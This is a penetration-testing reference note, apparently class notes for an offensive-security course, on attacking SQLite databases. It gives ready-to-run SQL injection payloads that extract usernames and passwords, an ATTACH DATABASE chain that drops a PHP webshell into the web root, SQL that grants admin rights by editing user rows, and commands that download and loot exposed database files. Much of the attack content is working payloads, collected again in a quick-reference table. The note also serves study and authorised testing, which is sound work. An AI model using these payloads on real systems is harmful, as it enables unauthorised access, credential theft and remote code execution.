# SQLite

#SQLite #database #RDBMS #embedded #fileformat

## What is SQLite?

Serverless, zero-config, **file-backed** relational database — the entire database (schema, tables, indexes, rows) lives in **one file** (`.db`, `.sqlite`, `.sqlite3`, or any extension). No daemon, no port, no network, and — the part that matters on an engagement — **no user/privilege layer at all**: access control is entirely the file's POSIX/NTFS permissions. If you can read the file you read every row; if you can write it you own the application that trusts it. It is the most widely deployed database engine in the world — browsers, mobile apps, desktop apps, and small web apps (Django / Flask / Rails dev databases) all embed it.

Two ways it shows up:
- **A file you find** after a foothold → loot creds/sessions/tokens with [[Tools/Database/sqlite3|sqlite3]].
- **The back end of a web app** → SQL injection, but in the **SQLite dialect** with a file-write→RCE path that differs from MySQL/MSSQL.

- **No network service** — nothing to port-scan; you reach it through *file access* or *an app's injection point*.
- **File signature:** the first 16 bytes are the ASCII string `SQLite format 3\000` — so any extension (or none) can be a SQLite DB.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Database/sqlite3\|sqlite3]] | Open/query/dump a found `.db`, extract creds and browser stores |
| [[Tools/Database/SQLMap\|SQLMap]] | Automated SQLite injection (`--dbms=sqlite`) |
| [[Tools/Credential Dumping/LaZagne\|LaZagne]] | Decrypt browser credential stores (Chrome/Firefox SQLite files) |

---

## Enumeration

There's no service to fingerprint — you're finding *files*, or detecting SQLite *behind an app*.

```bash
# Find SQLite databases on a compromised host
find / \( -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' \) 2>/dev/null | grep -v /proc

# Confirm a file IS SQLite regardless of extension — check the magic bytes
file suspicious.bin
head -c 16 suspicious.bin        # -> "SQLite format 3"
```

Detect SQLite as an app's back end through an injection point (the version function is dialect-specific):

```sql
' UNION SELECT sqlite_version(),NULL-- -      -- e.g. 3.34.1  => back end is SQLite
' AND sqlite_version() IS NOT NULL-- -         -- boolean-blind confirmation
```

---

## Access

```bash
# Open a found database — full CLI reference in the tool note
sqlite3 found.db ".tables"
```

> [!warning] **A `.db` under the web root is a full-database download — no injection needed.** If the SQLite file sits below the document root and isn't blocked, `curl https://target/database.db -o loot.db` hands you every credential directly. Always try the common names: `database.db`, `db.sqlite3` (Django), `app.db`, `data.sqlite`, `database.sqlite`.

---

## Attack Vectors

### Loot a found database

Creds, session tokens, API keys, browser stores. Full CLI + browser-credential file locations are in [[Tools/Database/sqlite3\|sqlite3]]. The two commands you always run:

```sql
SELECT name, sql FROM sqlite_master WHERE type='table';   -- schema (SQLite's information_schema)
SELECT * FROM users;
```

### SQL injection — the SQLite dialect

Copied MySQL/MSSQL payloads break on SQLite in specific ways — this table is the difference:

| Need | SQLite |
|---|---|
| Comment | `--` or `/* */` — **not** `#` (that's MySQL) |
| String concat | `'a' || 'b'` — no `CONCAT()` before v3.44 |
| Version | `sqlite_version()` |
| Enumerate tables | `SELECT name, sql FROM sqlite_master WHERE type='table'` (aliased `sqlite_schema` since 3.33) |
| List columns | parse the `sql` column of `sqlite_master`, or `PRAGMA table_info(t)` |
| Blind primitives | `substr(x,i,1)`, `unicode()`, `hex()`, `length()` |

```sql
-- UNION extraction (match the column count first, pad with NULLs)
' UNION SELECT name, sql, NULL FROM sqlite_master WHERE type='table'-- -
' UNION SELECT username, password, NULL FROM users-- -
```

> [!note] **No file-read primitive, and `load_extension` is off by default.** Unlike MySQL (`LOAD_FILE`) or PostgreSQL (`pg_read_file`), SQLite has **no built-in arbitrary file read**, and `load_extension()` (→ RCE via a malicious `.so`) is **disabled in application drivers** unless explicitly enabled. So SQLite injection is mostly data-exfil plus the write path below — not the file-read/exec buffet the client-server engines hand you. Full dialect handling: [[Class notes/HTB Academy/CPTS v2 (claude)/SQL Injection|SQL Injection]].

### RCE — `ATTACH DATABASE` writes a webshell

The classic SQLite-injection-to-RCE. `ATTACH DATABASE` **creates a new SQLite file at an attacker-chosen path**; fill a text column with PHP and you've dropped a webshell — PHP ignores the binary SQLite header and executes the `<?php … ?>` inside it.

```sql
ATTACH DATABASE '/var/www/html/sh.php' AS sh;
CREATE TABLE sh.p (x TEXT);
INSERT INTO sh.p (x) VALUES ('<?php system($_GET[0]); ?>');
```

> [!warning] **Conditions — this needs stacked queries.** Many SQLite bindings (PHP PDO's default `prepare/execute`, Python's `sqlite3.execute()`) run **one statement per call**, which blocks the three-statement `ATTACH`/`CREATE`/`INSERT` chain — it needs a multi-statement `exec()`/`executescript()` context. You also need the web/DB user to be able to **write the target path**. Collect at `/sh.php?0=id`. (`$_GET[0]` — a numeric key — sidesteps the PHP 8 fatal on a bare `$_GET[cmd]`.)

### Write access → app takeover

If you can write the file directly (world-writable `.db`, or via the ATTACH RCE above), rewrite the app's own auth instead of cracking it:

```sql
UPDATE users SET is_admin = 1 WHERE username = 'you';
INSERT INTO users (username, password, role) VALUES ('x', '<hash>', 'admin');
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `.db` under the web root, downloadable | Whole database exfiltrated over HTTP — no injection required |
| World-readable `.db` (`0644` in a shared dir) | Any local user reads every stored credential |
| World-writable / app-writable `.db` | Auth bypass by editing rows; `ATTACH`-write RCE |
| `load_extension()` enabled in the app | Injection → arbitrary `.so` load → RCE |
| Secrets stored plaintext / weak hash | SQLite has no column encryption — the row *is* the plaintext to whoever reads the file |

---

## Quick Reference

| Goal | Command |
|---|---|
| Confirm a file is SQLite | `head -c 16 file` → `SQLite format 3` |
| Find DBs on a host | `find / \( -name '*.sqlite*' -o -name '*.db' \) 2>/dev/null` |
| Download an exposed DB | `curl https://target/database.db -o loot.db` |
| List tables (CLI) | `sqlite3 f.db .tables` |
| List tables (SQLi) | `SELECT name FROM sqlite_master WHERE type='table'` |
| Detect back end via SQLi | `UNION SELECT sqlite_version()` |
| Dump schema | `SELECT name, sql FROM sqlite_master` |
| Injection → webshell | `ATTACH DATABASE '/var/www/html/sh.php' AS s; CREATE TABLE s.p(x); INSERT INTO s.p VALUES('<?php system($_GET[0]);?>')` |

> [!note] **See also** — [[Exploits/find_sqlite|find_sqlite.sh]] (custom tool: locate every SQLite DB on a foothold by magic bytes, incl. unnamed ones), [[Tools/Database/sqlite3|sqlite3]].

---

*Created: 2026-08-20*
*Updated: 2026-08-25*
*Model: claude-opus-5*
